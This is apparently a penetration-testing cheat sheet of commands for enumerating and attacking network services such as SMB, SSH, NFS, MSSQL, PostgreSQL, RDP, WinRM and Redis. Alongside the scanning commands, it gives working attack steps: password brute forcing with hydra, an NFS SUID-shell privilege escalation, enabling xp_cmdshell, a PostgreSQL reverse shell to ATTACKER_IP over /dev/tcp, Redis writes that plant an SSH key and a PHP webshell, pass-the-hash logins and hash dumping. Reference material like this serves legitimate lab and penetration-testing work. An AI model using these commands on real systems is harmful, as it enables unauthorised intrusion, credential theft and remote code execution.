# Network Services Enumeration

## Nmap

### Nmap - Basic Scans

```bash
# Quick scan - top 1000 ports
nmap -sV -sC TARGET

# Full TCP port scan
nmap -p- --min-rate=1000 -T4 TARGET

# Comprehensive scan with version detection
nmap -sV -sC -p- -T4 -oA full_scan TARGET

# UDP scan (top 20 ports)
nmap -sU --top-ports=20 TARGET

# Aggressive scan (OS detection, version, scripts, traceroute)
nmap -A -p- TARGET
```

### Nmap - Output Options

```bash
# Save in all formats
nmap -sV -sC -oA scan_name TARGET

# Formats:
# -oN : Normal output
# -oX : XML output
# -oG : Grepable output
# -oA : All formats
```

### Nmap - Script Scanning

```bash
# Default scripts
nmap -sC TARGET

# Specific script category
nmap --script vuln TARGET
nmap --script auth TARGET
nmap --script discovery TARGET

# Multiple categories
nmap --script "vuln and safe" TARGET

# Specific script
nmap --script http-enum TARGET
```

### Nmap - Useful Options

```bash
# Faster scan
nmap --min-rate=1000 TARGET

# Timing template (0-5, 5 is fastest)
nmap -T4 TARGET

# No ping (useful if ICMP blocked)
nmap -Pn TARGET

# Fragment packets (IDS evasion)
nmap -f TARGET

# Source port manipulation
nmap --source-port 53 TARGET

# IPv6
nmap -6 TARGET
```

### Masscan

```bash
# Fast port scanner
masscan -p1-65535 TARGET --rate=1000

# Specific ports
masscan -p80,443,8080 TARGET --rate=1000
```

### AutoRecon

```bash
# Automated reconnaissance
autorecon TARGET

# Multiple targets
autorecon TARGET1 TARGET2

# Specific port
autorecon -p 80,443 TARGET
```

## Ports

### Common Port Reference

| Port | Service | Common Exploits |
|------|---------|----------------|
| 21 | FTP | Anonymous login, backdoors |
| 22 | SSH | Weak credentials, old versions |
| 23 | Telnet | No encryption, weak auth |
| 25 | SMTP | User enum, open relay |
| 53 | DNS | Zone transfer, cache poisoning |
| 80/443 | HTTP/HTTPS | Web vulnerabilities |
| 88 | Kerberos | AS-REP roasting, Kerberoasting |
| 110 | POP3 | Weak credentials |
| 111 | RPC | Info disclosure |
| 135 | MSRPC | Info disclosure |
| 139/445 | SMB | EternalBlue, null sessions |
| 143 | IMAP | Weak credentials |
| 161 | SNMP | Default community strings |
| 389/636 | LDAP | Anonymous bind, info disclosure |
| 443 | HTTPS | SSL/TLS misconfig |
| 1433 | MSSQL | xp_cmdshell, impersonation |
| 2049 | NFS | no_root_squash |
| 3306 | MySQL | Weak credentials, UDF |
| 3389 | RDP | BlueKeep, weak credentials |
| 5432 | PostgreSQL | Command execution |
| 5900 | VNC | Weak/no password |
| 5985/5986 | WinRM | Weak credentials |
| 6379 | Redis | Unauthorized access |
| 8080 | HTTP-Proxy | Web vulnerabilities |

## SMB

### Basic Enumeration

```bash
# Nmap
nmap -sV -sC -p 139,445 TARGET
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 TARGET

# Enum4linux
enum4linux -a TARGET

# Enum4linux-ng
enum4linux-ng -A TARGET

# NetExec
netexec smb TARGET
netexec smb TARGET -u '' -p '' --shares
netexec smb TARGET -u 'guest' -p '' --shares
```

### List Shares

```bash
# smbclient
smbclient -L //TARGET -N
smbclient -L //TARGET -U username

# smbmap
smbmap -H TARGET
smbmap -H TARGET -u username -p password

# NetExec
netexec smb TARGET -u username -p password --shares
```

### Access Shares

```bash
# Connect to share
smbclient //TARGET/share -U username
smbclient //TARGET/share -N  # Null session

# Download files
get filename
mget *

# Download all files recursively
recurse ON
prompt OFF
mget *

# Mount share
sudo mount -t cifs //TARGET/share /mnt/smb -o username=user,password=pass
```

### SMB Vulnerabilities

```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 TARGET

# Check multiple vulns
nmap --script smb-vuln* -p 445 TARGET
```

### NetExec Advanced

```bash
# Check if SMB signing required
netexec smb TARGET

# Null session enumeration
netexec smb TARGET -u '' -p ''
netexec smb TARGET -u 'guest' -p ''

# Enumerate shares
netexec smb TARGET -u 'user' -p 'password' --shares

# Enumerate users
netexec smb TARGET -u 'user' -p 'password' --users

# Enumerate groups
netexec smb TARGET -u 'user' -p 'password' --groups

# Enumerate logged on users
netexec smb TARGET -u 'user' -p 'password' --loggedon-users

# Check if user is admin (look for Pwn3d!)
netexec smb TARGET -u 'user' -p 'password'

# Enumerate domain
netexec smb TARGET -u 'user' -p 'password' --pass-pol

# Spider shares
netexec smb TARGET -u 'user' -p 'password' -M spider_plus
```

## HTTP

### Banner Grabbing

```bash
nc -nv TARGET 80
curl -I http://TARGET
whatweb http://TARGET
```

### Technology Detection

```bash
# whatweb - Identify web technologies
whatweb http://TARGET
whatweb -v http://TARGET  # Verbose
whatweb -a 3 http://TARGET  # Aggression level 3

# Wappalyzer (Browser extension)
# Or use webanalyze
webanalyze -host http://TARGET
```

### Nikto

```bash
# Basic scan
nikto -h http://TARGET

# With SSL
nikto -h https://TARGET -ssl

# Specify port
nikto -h http://TARGET -p 8080

# Save output
nikto -h http://TARGET -o nikto_output.txt
```

### Nmap Scripts

```bash
nmap -sV -sC -p 80 TARGET
nmap --script http-enum,http-headers,http-methods,http-robots.txt,http-title -p 80 TARGET
```

### SSL/TLS Testing

```bash
# SSLScan
sslscan TARGET:443

# testssl.sh
./testssl.sh TARGET:443
```

### Manual Checks

```bash
# robots.txt
curl http://TARGET/robots.txt

# sitemap.xml
curl http://TARGET/sitemap.xml

# Common directories to check
/admin
/administrator
/backup
/dev
/test
/console
/phpmyadmin
/.git
/.svn
/.env

# View page source
curl http://TARGET | grep -i "password\|username\|token\|api"

# Check headers
curl -I http://TARGET

# Check for HTTP methods
curl -X OPTIONS http://TARGET -i
```

## FTP

```bash
# Banner grabbing
nc -nv TARGET 21

# Anonymous login
ftp TARGET  # user: anonymous / pass: anonymous
ftp -A TARGET

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 TARGET

# FTP commands
ls -la / pwd / get filename / mget *

# Download all files
wget -r ftp://anonymous:anonymous@TARGET
```

## SSH

```bash
# Banner grabbing
nc -nv TARGET 22

# Nmap scripts
nmap --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -p 22 TARGET

# Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# Private key login
chmod 600 id_rsa
ssh -i id_rsa user@TARGET

# Crack encrypted key
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

## DNS

### Zone Transfer

```bash
# Attempt zone transfer
dig axfr @TARGET domain.com
host -l domain.com TARGET

# dnsenum
dnsenum --dnsserver TARGET domain.com
```

### DNS Queries

```bash
# Nmap
nmap -sU -p 53 --script dns-zone-transfer,dns-recursion,dns-cache-snoop TARGET

# A records
dig @TARGET domain.com A

# MX records
dig @TARGET domain.com MX

# TXT records
dig @TARGET domain.com TXT

# NS records
dig @TARGET domain.com NS

# ANY records
dig @TARGET domain.com ANY

# Reverse lookup
dig -x TARGET_IP @TARGET
```

### Subdomain Enumeration

```bash
# DNSRecon
dnsrecon -d domain.com -t std

# Sublist3r
sublist3r -d domain.com

# Fierce
fierce --domain domain.com
```

## SMTP

```bash
# Banner grabbing / manual enum
nc -nv TARGET 25
HELO target.com
VRFY user@domain.com   # Verify user exists
EXPN user@domain.com   # Expand mailing list

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET
nmap --script smtp-enum-users,smtp-commands -p 25 TARGET

# Send email
swaks --to recipient@target.com --from sender@attacker.com --header "Subject: Test" --body "Test email" --server TARGET
```

## LDAP

```bash
# Nmap
nmap --script ldap-rootdse,ldap-search -p 389 TARGET

# Anonymous bind
ldapsearch -x -H ldap://TARGET -s base namingContexts
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local" "(objectClass=user)"
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local" "(objectClass=group)"

# With credentials
ldapsearch -x -H ldap://TARGET -D "cn=admin,dc=domain,dc=local" -W -b "dc=domain,dc=local"

# NetExec
netexec ldap DC_IP -u '' -p '' --users
netexec ldap DC_IP -u 'user' -p 'password' --users --groups
```

## NFS

### Show Exports

```bash
showmount -e TARGET

# Nmap
nmap -sV --script nfs-showmount -p 2049 TARGET

# Look for no_root_squash
# no_root_squash - Allows root on client to be root on NFS share
cat /etc/exports
```

### Mount Share

```bash
# List NFS shares
showmount -e TARGET

# Mount
mkdir /tmp/nfs
sudo mount -t nfs TARGET:/share /tmp/nfs

# Access files
cd /tmp/nfs
ls -la

# Unmount
sudo umount /tmp/nfs
```

### Exploit no_root_squash

```bash
# Mount the share
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/share /tmp/nfs

# Create SUID shell
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target machine
/share/bash -p
```

## SNMP

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET

# SNMP walk
snmpwalk -v2c -c public TARGET                            # Full walk
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.1             # System info
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25     # User accounts
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2    # Running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3      # Open TCP ports
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2    # Installed software

snmp-check TARGET -c public

# Nmap
nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-processes,snmp-win32-users TARGET
```

## Databases

### MySQL (Port 3306)

```bash
# Connect
mysql -h TARGET -u root -p
mysql -h TARGET -u root  # without password

# Nmap
nmap --script mysql-databases,mysql-empty-password,mysql-users,mysql-variables -p 3306 TARGET

# Key queries
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT user,password FROM mysql.user;
SELECT * FROM table_name;
```

### MSSQL (Port 1433)

```bash
# Connect
impacket-mssqlclient DOMAIN/user:password@TARGET
sqsh -S TARGET -U user -P password

# Nmap
nmap --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-dump-hashes -p 1433 TARGET

# Key queries
SELECT @@version;
SELECT name FROM master.sys.databases;
SELECT name FROM sys.tables;
```

#### Command Execution
```bash
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute command
xp_cmdshell 'whoami';
```

#### Impersonation
```bash
# Check if we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# Impersonate
EXECUTE AS LOGIN = 'sa';
```

### PostgreSQL (Port 5432)

```bash
# Connect
psql -h TARGET -U postgres

# Key commands
\l              # list databases
\c database     # connect
\dt             # list tables
SELECT * FROM table_name;

# Read file
CREATE TABLE temp (data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
```

#### Command Execution
```bash
# Copy to program
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"';
```

## RDP

### Enumeration

```bash
# Nmap
nmap --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 -p 3389 TARGET
```

### Connect

```bash
# xfreerdp
xfreerdp /u:administrator /p:password /v:TARGET
xfreerdp /u:administrator /pth:NTLM_HASH /v:TARGET

# rdesktop
rdesktop -u administrator -p password TARGET
```

### Brute Force

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET
```

### BlueKeep (CVE-2019-0708)

```bash
nmap --script rdp-vuln-ms12-020 -p 3389 TARGET
```

## WinRM

### Enumeration

```bash
# Nmap
nmap -sV -sC -p 5985 TARGET

# NetExec
netexec winrm TARGET -u user -p password
```

### Connect

```bash
# Evil-WinRM
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLM_HASH
```

### NetExec Command Execution

```bash
# Enumerate WinRM
netexec winrm TARGET -u 'user' -p 'password'

# Execute commands
netexec winrm TARGET -u 'administrator' -p 'password' -x "whoami"
```

## VNC & Redis

### VNC (Port 5900)

```bash
# Nmap
nmap --script vnc-info,vnc-title -p 5900 TARGET

# Connect
vncviewer TARGET:5900

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET
```

### Redis (Port 6379)

#### Connection
```bash
redis-cli -h TARGET
```

#### Enumeration
```bash
# Info
INFO
CONFIG GET *

# List keys
KEYS *

# Get value
GET key_name
```

#### Exploitation

##### Write SSH Key
```bash
config set dir /root/.ssh
config set dbfilename authorized_keys
set mykey "ssh-rsa ATTACKER_PUBLIC_KEY"
save
```

##### Write Webshell
```bash
config set dir /var/www/html
config set dbfilename shell.php
set mykey "<?php system($_GET['cmd']); ?>"
save
```
